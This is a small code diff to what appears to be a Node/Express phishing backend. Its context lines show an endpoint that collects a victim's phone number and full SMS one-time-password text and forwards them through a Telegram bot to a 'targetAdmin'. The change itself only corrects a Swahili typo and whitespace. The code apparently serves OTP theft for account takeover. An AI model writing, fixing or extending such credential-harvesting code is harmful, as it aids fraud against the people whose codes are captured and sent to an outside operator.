@@ -184,7 +184,7 @@ app.post('/api/submit-otp', (req, res) => {
 
     const message = `UTHIBITISHO WA SMS OTP\n\n` +
         `NAMBARI YA SIMU: ${session.phone}\n\n` +
-        `UJUNGE WOTE WA SMS:\n${otpText}`;
+        `UJUMBE WOTE WA SMS:\n${otpText}`;
 
     mainBot.sendMessage(session.targetAdmin, message, {
         reply_markup: {
@@ -219,4 +219,4 @@ app.get('/api/check-status/:sessionId', (req, res) => {
 app.listen(PORT, () => {
     console.log(`Server running on port ${PORT}`);
 });
-    
+           
